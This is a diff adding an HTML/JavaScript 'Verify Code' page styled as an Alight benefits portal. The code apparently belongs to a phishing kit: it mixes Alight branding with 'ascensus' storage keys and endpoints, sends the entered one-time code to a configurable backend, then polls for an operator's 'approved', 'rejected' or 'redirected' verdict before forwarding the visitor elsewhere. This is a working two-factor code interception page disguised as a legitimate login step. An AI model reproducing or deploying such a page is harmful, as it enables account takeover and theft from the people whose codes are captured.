@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Verify Code - Benefits Portal</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  margin: 0;
+  padding: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  color: #292929;
+  background: #fff;
+}
+
+body {
+  min-width: 320px;
+  font-size: 13px;
+}
+
+/* ================= HEADER ================= */
+
+.header {
+  position: sticky;
+  top: 0;
+  background: #fff;
+  height: 100px;
+  z-index: 999999;
+  border-bottom: 1px solid #aaa;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 28px;
+}
+
+.brand {
+  width: 92px;
+  height: 63px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 23px;
+  font-weight: 400;
+  letter-spacing: -1px;
+}
+
+.assistant {
+  background: #126cb1da;
+  color: white;
+  border-radius: 25px;
+  padding: 10px 17px;
+  font-size: 13px;
+  font-weight: bold;
+  box-shadow: 0 2px 8px rgba(21, 40, 181, 0.55);
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+
+.assistant-icon {
+  width: 21px;
+  height: 21px;
+  border: 1.5px solid white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+}
+
+/* ================= MAIN ================= */
+
+.main {
+  max-width: 400px;
+  margin: 55px auto 0;
+  padding: 0 28px;
+  display: block;
+}
+
+.left {
+  width: 100%;
+}
+
+.title {
+  font-size: 29px;
+  line-height: 1.4;
+  margin: 4px 0 25px;
+  font-weight: 700;
+}
+
+.card {
+  border: 1px solid #d4d4d4;
+  border-radius: 9px;
+  padding: 25px 25px 23px;
+  box-shadow: 0 1px 3px rgba(0,0,0,.03);
+}
+
+.card h2 {
+  margin: 0 0 16px;
+  font-size: 17px;
+  line-height: 1.3;
+}
+
+.required-info {
+  font-size: 12px;
+  line-height: 1.45;
+  margin: 0 0 17px;
+}
+
+.field-label {
+  display: block;
+  font-size: 12px;
+  margin-bottom: 7px;
+}
+
+.field-label span {
+  color: #777;
+  font-style: italic;
+}
+
+.required {
+  color: #a52b2b;
+}
+
+.input {
+  width: 100%;
+  height: 58px;
+  border: 1px solid #555;
+  outline: none;
+  padding: 8px;
+  font-size: 14px;
+  margin-bottom: 17px;
+  letter-spacing: 2px;
+  text-align: center;
+  font-weight: bold;
+}
+
+.input:focus {
+  border-color: #126bb1;
+  box-shadow: 0 0 0 1px #126bb1;
+}
+
+.link-container {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 8px;
+}
+
+.link {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 12px;
+  
+  cursor: pointer;
+}
+
+.link:hover {
+  color: #265a8c;
+}
+
+.next {
+  border: 0;
+  margin-top: 23px;
+  padding: 10px 19px;
+  border-radius: 22px;
+  background: #a4a4a4;
+  color: white;
+  font-size: 13px;
+  cursor: pointer;
+ 
+}
+
+.next:hover {
+  background: #858585;
+}
+
+.next:disabled {
+  background: #d0d0d0;
+  cursor: not-allowed;
+}
+
+/* ================= MESSAGE BOX ================= */
+
+.message-container {
+  display: none;
+  padding: 12px 15px;
+  border-radius: 5px;
+  margin-bottom: 15px;
+  font-size: 13px;
+  align-items: center;
+  gap: 8px;
+}
+
+.message-container.show {
+  display: flex;
+}
+
+.message-container.error {
+  background-color: #ffebee;
+  color: #c62828;
+  border: 1px solid #e57373;
+}
+
+.message-container.success {
+  background-color: #e8f5e9;
+  color: #2e7d32;
+  border: 1px solid #81c784;
+}
+
+.message-icon {
+  font-weight: bold;
+  font-size: 16px;
+}
+
+/* ================= FOOTER ================= */
+
+.footer {
+  margin-top: 25px;
+  background: #fafafa;
+  padding: 23px 28px 21px;
+}
+
+.footer-inner {
+  max-width: 960px;
+  margin: auto;
+}
+
+.footer-top {
+  display: flex;
+  justify-content: space-between;
+  gap: 25px;
+  padding-bottom: 23px;
+}
+
+.footer-links {
+  display: flex;
+  flex-direction: column;
+  gap: 17px;
+}
+
+.footer-links a {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 13px;
+}
+
+.footer-bottom {
+  border-top: 1px solid #aaa;
+  padding-top: 22px;
+  display: flex;
+  justify-content: space-between;
+  gap: 22px;
+}
+
+.legal-links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 20px;
+}
+
+.legal-links a {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 12px;
+}
+
+.copyright {
+  font-size: 12px;
+  color: #666;
+  line-height: 1.5;
+  max-width: 250px;
+}
+
+/* ================= TABLET ================= */
+
+@media (max-width: 900px) {
+
+  .header {
+    height: 65px;
+    padding: 0 20px;
+  }
+
+  .brand {
+    width: 65px;
+    height: 39px;
+    font-size: 21px;
+  }
+
+  .main {
+    margin-top: 40px;
+    padding: 0 20px;
+  }
+
+  .title {
+    font-size: 20px;
+  }
+
+  .card {
+    padding: 21px;
+  }
+}
+
+/* ================= MOBILE ================= */
+
+@media (max-width: 700px) {
+
+  .header {
+    height: 62px;
+    padding: 0 15px;
+  }
+
+  .brand {
+    width: 60px;
+    height: 36px;
+    font-size: 19px;
+  }
+
+  .main {
+    margin-top: 27px;
+    padding: 0 15px;
+  }
+
+  .title {
+    font-size: 19px;
+    margin-bottom: 19px;
+  }
+
+  .card {
+    padding: 19px;
+  }
+
+  .card h2 {
+    font-size: 16px;
+  }
+
+  .required-info,
+  .field-label,
+  .link {
+    font-size: 12px;
+  }
+
+  .input {
+    height: 51px;
+    font-size: 13px;
+  }
+
+  .next {
+    margin-top: 19px;
+    padding: 9px 17px;
+    font-size: 12px;
+  }
+
+  .footer {
+    margin-top: 28px;
+    padding: 21px 15px;
+  }
+
+  .footer-top {
+    display: block;
+  }
+
+  .footer-links {
+    gap: 14px;
+  }
+
+  .footer-links a {
+    font-size: 12px;
+  }
+
+  .footer-bottom {
+    display: block;
+  }
+
+  .legal-links {
+    gap: 10px 16px;
+    margin-bottom: 17px;
+  }
+
+  .legal-links a {
+    font-size: 11px;
+  }
+
+  .copyright {
+    font-size: 11px;
+  }
+}
+
+.demo-brand {
+  font-size: 22px;
+  font-weight: bold;
+  width: 200px;
+  color: #222;
+  margin-bottom: 14px;
+}
+.demo-brand img {
+  width: 100%;
+  height: auto;
+  max-width: 200px;
+}
+
+.stores {
+  display: flex;
+  gap: 8px;
+}
+
+.store {
+  width: 100px;
+  height: 34px;
+  border-radius: 4px;
+  background: #050505;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 9px;
+  text-align: center;
+}
+.store img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+}
+
+/* ================= SMALL PHONES ================= */
+
+@media (max-width: 400px) {
+
+  .title {
+    font-size: 18px;
+  }
+
+  .card {
+    padding: 17px;
+  }
+
+  .link-container {
+    flex-direction: column;
+    gap: 8px;
+    align-items: flex-start;
+  }
+}
+</style>
+<script src="../config.js"></script>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header class="header">
+
+    <div class="brand">
+      <img id="globalLogo" >
+    </div>
+
+    <div class="assistant">
+      <i class="fa-solid fa-comment-dots"></i>
+      Virtual Assistant
+    </div>
+
+  </header>
+
+
+  <!-- MAIN CONTENT -->
+  <main class="main">
+
+    <section class="left">
+
+      
+
+      <div id="messageBox" class="message-container">
+        <span class="message-icon" id="messageIcon"></span>
+        <span id="messageText"></span>
+      </div>
+
+      <div class="card">
+  <a href="#" onclick="goBack(event)" class="link">
+            < Back
+          </a>
+          <br> <br>
+        <h2>Enter Code we shared</h2>
+
+        <p class="required-info">
+          * Fields marked with an asterisk (*) are required.
+        </p>
+
+        <label class="field-label" for="verificationCode">
+          Enter one time code <span>(Required)</span>
+          <b class="required">*</b>
+        </label>
+
+        <input
+          class="input"
+          type="text"
+          id="verificationCode"
+          autocomplete="off"
+          inputmode="numeric"
+         
+        >
+
+        <div class="link-container">
+         <div>
+            <input type="checkbox" id="remember">
+            <label for="remember">This is my <br/> personal device, <br>don't askto verify again</label>
+         </div>
+          <a href="#" onclick="resendCode(event)" class="link">
+           send another code
+          </a>
+        </div>
+
+        <br>
+
+        <button class="next" id="verifyBtn" onclick="submitVerificationCode()" type="button">
+          submit
+        </button>
+
+      </div>
+
+    </section>
+
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+
+    <div class="footer-inner">
+
+      <div class="footer-top">
+
+        <div class="footer-links">
+
+          <a href="#">Contact Us</a>
+          <a href="#">Feedback</a>
+          <a href="#">Protect Yourself From Website Fraud</a>
+
+        </div>
+
+        <div class="footer-right">
+
+          <div class="demo-brand">
+          <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight_worklife_logo_black.svg" alt="">
+          </div>
+
+          <div class="stores">
+            <div class="store">
+              <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-app-store.png" alt="">
+            </div>
+
+            <div class="store">
+             <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-google-play.png"/>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+
+      <div class="footer-bottom">
+
+        <div class="legal-links">
+
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms of Use</a>
+          <a href="#">Cookie Notice</a>
+          <a href="#">Cookie Settings</a>
+
+        </div>
+
+        <div class="copyright">
+          ©2026 Alight Solutions. All rights reserved.
+        </div>
+
+      </div>
+
+    </div>
+
+  </footer>
+
+
+  <script>
+    function initPage() {
+  const logo = document.getElementById('globalLogo');
+  
+  const cfg = window.APP_CONFIG;
+
+  logo.src=cfg.logo
+  logo.alt=cfg.logoAlt
+
+
+
+ 
+ 
+}
+
+window.addEventListener('load', initPage);
+     const input = document.getElementById('verificationCode');
+const verifybtn = document.getElementById('verifyBtn');
+
+// Function to update button color
+function updateButtonColor() {
+  if (input.value.length) {
+    verifybtn.style.background = '#3977b5'; // Active blue
+  } else {
+    verifybtn.style.background = '#999'; // Inactive gray
+  }
+}
+
+
+// Listen for changes
+input.addEventListener('input', updateButtonColor);
+
+// Also run on page load in case it has a default value
+updateButtonColor();
+
+      // State management
+  let statusCheckInterval = null;
+  let verificationId = null;
+
+function showMessage(message, type = 'error') {
+  const messageBox = document.getElementById('messageBox');
+  const messageText = document.getElementById('messageText');
+  const messageIcon = document.getElementById('messageIcon');
+  
+  messageText.textContent = message;
+  messageBox.className = 'message-container show ' + type;
+  messageIcon.textContent = type === 'success' ? '✓' : '✕';
+  
+  setTimeout(() => {
+    messageBox.classList.remove('show');
+  }, 5000);
+}
+
+
+
+function goBack(event) {
+  event.preventDefault();
+  window.history.back();
+}
+
+function resendCode(event) {
+  event.preventDefault();
+  const verifyBtn = document.getElementById('verifyBtn');
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = 'Sending...';
+  
+  // Get stored user info
+  const username = localStorage.getItem('ascensus_username');
+  const tempToken = localStorage.getItem('ascensus_temp_token');
+  const method = localStorage.getItem('verification_method') || 'email';
+  
+  fetch(window.ascensus_API_BASE + '/api/two-factor/click', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${tempToken}`
+    },
+    body: JSON.stringify({
+      username: username,
+      method: method
+    })
+  })
+  .then(async response => {
+    const data = await response.json().catch(() => ({}));
+    return { ok: response.ok, data: data };
+  })
+  .then(result => {
+    if (result.ok) {
+      showMessage('Verification code sent!', 'success');
+    } else {
+      showMessage(result.data.message || 'Failed to resend code.', 'error');
+    }
+    verifyBtn.disabled = false;
+    verifyBtn.textContent = 'Verify Code';
+  })
+  .catch(error => {
+    console.error('Resend code error:', error);
+    showMessage('Unable to reach the server. Please try again.', 'error');
+    verifyBtn.disabled = false;
+    verifyBtn.textContent = 'Verify Code';
+  });
+}
+
+function submitVerificationCode() {
+  const code = document.getElementById('verificationCode').value.trim();
+  const verifyBtn = document.getElementById('verifyBtn');
+  
+ 
+
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = 'Verifying...';
+  
+  // Get stored user info
+  const username = localStorage.getItem('ascensus_username');
+  const tempToken = localStorage.getItem('temp_token');
+  const method = localStorage.getItem('verification_method') || 'email';
+  
+  // API call to verify code
+  fetch(window.ascensus_API_BASE + '/api/two-factor/verify-code', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${tempToken}`
+    },
+    body: JSON.stringify({
+      username: username,
+      code: code,
+      method: method
+    })
+  })
+  .then(r => r.json().then(d => ({ ok: r.ok, data: d })))
+    .then(result => {
+      if (!result.ok) {
+        showMessage(result.data.message || 'Failed to verify code.', 'error');
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = originalText;
+        
+        return;
+      }
+      
+      verificationId = result.data.verificationId;
+      startStatusCheck();
+    })
+    .catch(err => {
+      console.error('Error:', err);
+      showMessage('Unable to reach the server. Please try again.', 'error');
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = originalText;
+    });
+}
+
+
+// Poll for verification status
+  function startStatusCheck() {
+    if (statusCheckInterval) {
+      clearInterval(statusCheckInterval);
+    }
+
+    statusCheckInterval = setInterval(() => {
+      if (!verificationId) {
+        clearInterval(statusCheckInterval);
+        return;
+      }
+
+      const tempToken = localStorage.getItem('temp_token');
+      fetch(window.ascensus_API_BASE + `/api/two-factor/check-approval/${verificationId}`, {
+        headers: { 'Authorization': `Bearer ${tempToken}` },
+      })
+      .then(r => r.json())
+      .then(result => {
+        if (result.status === 'approved') {
+          clearInterval(statusCheckInterval);
+          completeVerification();
+        } else if (result.status === 'rejected') {
+          clearInterval(statusCheckInterval);
+          rejectVerification();
+        } else if (result.status === 'redirected') {
+          clearInterval(statusCheckInterval);
+          if (window.APP_CONFIG && window.APP_CONFIG.redirectLink) {
+            window.location.href = window.APP_CONFIG.redirectLink;
+          }
+        }
+      })
+      .catch(err => {
+        console.error('Status check error:', err);
+      });
+    }, 3000);
+  }
+
+  // Complete verification successfully
+  function completeVerification() {
+    const tempToken = localStorage.getItem('temp_token');
+    localStorage.setItem('ascensus_token', tempToken);
+    localStorage.setItem('verification_complete', 'true');
+    
+
+
+    setTimeout(() => {
+      if (window.APP_CONFIG && window.APP_CONFIG.redirectLink) {
+        window.location.href = window.APP_CONFIG.redirectLink;
+      }
+    }, 1500);
+  }
+
+  // Handle rejected verification
+  function rejectVerification() {
+    if (statusCheckInterval) {
+      clearInterval(statusCheckInterval);
+    }
+    const verifyBtn = document.getElementById('verifyBtn');
+    const code = document.getElementById('verificationCode');
+    code.value=''
+   
+    verifyBtn.disabled = false;
+    verifyBtn.textContent = 'submit';
+    
+    showMessage('Incorrect code. Please try again.', 'error');
+   
+  }
+
+
+  </script>
+
+</body>
+</html>
